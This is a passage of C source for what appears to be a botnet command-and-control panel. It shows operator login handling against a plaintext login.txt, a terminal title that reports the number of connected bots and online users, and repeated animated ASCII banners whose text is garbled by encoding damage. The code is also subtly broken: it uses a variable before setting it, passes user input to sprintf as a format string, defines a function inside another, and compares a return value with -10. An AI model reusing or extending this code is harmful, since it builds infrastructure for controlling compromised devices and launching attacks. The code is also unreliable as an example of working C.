    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[93mUsername\e[97m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[93mPassword\e[97m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

		char yes1 [500];
		char yes2 [500];
		char yes3 [500];
		char yes4 [500];
		char yes5 [500];
		
		sprintf(yes1,  "\e[93mPlease wait... I am verifying if you are a gHoSt \e[97m[\e[93m|\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes2,  "\e[93mPlease wait... I am verifying if you are a gHoSt \e[97m[\e[93m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes3,  "\e[93mPlease wait... I am verifying if you are a gHoSt \e[97m[\e[93m-\e[97m]\r\n", accounts[find_line].username);																																															//278e1c93e9c197d7eb07829bc6cf205d
		sprintf(yes4,  "\e[93mPlease wait... I am verifying if you are a gHoSt \e[97m[\e[93m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes5,  "\e[93mPlease wait... I am verifying if you are a gHoSt \e[97m[\e[93m-\e[97m]\r\n", accounts[find_line].username);
		
		
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes1, strlen(yes1), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes2, strlen(yes2), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes3, strlen(yes3), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes4, strlen(yes4), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes5, strlen(yes5), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Bots Connected [ %d ] | [ %s ] - Users Online [ %d ]%c", '\033', BotsConnected(), accounts[find_line].username, OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
   		char x5asciibannerline1   [5000];
		char x5asciibannerline2   [5000];
		char x5asciibannerline3   [5000];
		char x5asciibannerline4   [5000];
		char x5asciibannerline5   [5000];
		char x5asciibannerline6   [5000];
		char x5asciibannerline7   [5000];
		
  sprintf(x5asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(x5asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(x5asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(x5asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(x5asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(x5asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(x5asciibannerline7,   "\e[39mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

 		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline1, strlen(x5asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline2, strlen(x5asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline3, strlen(x5asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline4, strlen(x5asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline5, strlen(x5asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline6, strlen(x5asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, x5asciibannerline7, strlen(x5asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");
 
 		char yeet2asciibannerline1   [5000];
		char yeet2asciibannerline2   [5000];
		char yeet2asciibannerline3   [5000];
		char yeet2asciibannerline4   [5000];
		char yeet2asciibannerline5   [5000];
		char yeet2asciibannerline6   [5000];
		char yeet2asciibannerline7   [5000];
		
  sprintf(yeet2asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(yeet2asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(yeet2asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(yeet2asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(yeet2asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(yeet2asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(yeet2asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline1, strlen(yeet2asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline2, strlen(yeet2asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline3, strlen(yeet2asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline4, strlen(yeet2asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline5, strlen(yeet2asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline6, strlen(yeet2asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yeet2asciibannerline7, strlen(yeet2asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");
 
  		char lmao3asciibannerline1   [5000];
		char lmao3asciibannerline2   [5000];
		char lmao3asciibannerline3   [5000];
		char lmao3asciibannerline4   [5000];
		char lmao3asciibannerline5   [5000];
		char lmao3asciibannerline6   [5000];
		char lmao3asciibannerline7   [5000];
		
  sprintf(lmao3asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(lmao3asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmao3asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmao3asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmao3asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmao3asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmao3asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -10) goto end;
		if(send(datafd, lmao3asciibannerline1, strlen(lmao3asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline2, strlen(lmao3asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline3, strlen(lmao3asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline4, strlen(lmao3asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline5, strlen(lmao3asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline6, strlen(lmao3asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmao3asciibannerline7, strlen(lmao3asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");
 
   		char lol4asciibannerline1   [5000];
		char lol4asciibannerline2   [5000];
		char lol4asciibannerline3   [5000];
		char lol4asciibannerline4   [5000];
		char lol4asciibannerline5   [5000];
		char lol4asciibannerline6   [5000];
		char lol4asciibannerline7   [5000];
		
  sprintf(lol4asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(lol4asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lol4asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lol4asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lol4asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lol4asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lol4asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline1, strlen(lol4asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline2, strlen(lol4asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline3, strlen(lol4asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline4, strlen(lol4asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline5, strlen(lol4asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline6, strlen(lol4asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lol4asciibannerline7, strlen(lol4asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");

   		char xd5asciibannerline1   [5000];
		char xd5asciibannerline2   [5000];
		char xd5asciibannerline3   [5000];
		char xd5asciibannerline4   [5000];
		char xd5asciibannerline5   [5000];
		char xd5asciibannerline6   [5000];
		char xd5asciibannerline7   [5000];
		
  sprintf(xd5asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(xd5asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(xd5asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(xd5asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€â”€\e[38;5;166mâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(xd5asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(xd5asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(xd5asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

 		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline1, strlen(xd5asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline2, strlen(xd5asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline3, strlen(xd5asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline4, strlen(xd5asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline5, strlen(xd5asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline6, strlen(xd5asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
  		if(send(datafd, xd5asciibannerline7, strlen(xd5asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");

		char haha8asciibannerline1   [5000];
		char haha8asciibannerline2   [5000];
		char haha8asciibannerline3   [5000];
		char haha8asciibannerline4   [5000];
		char haha8asciibannerline5   [5000];
		char haha8asciibannerline6   [5000];
		char haha8asciibannerline7   [5000];
		
  sprintf(haha8asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(haha8asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
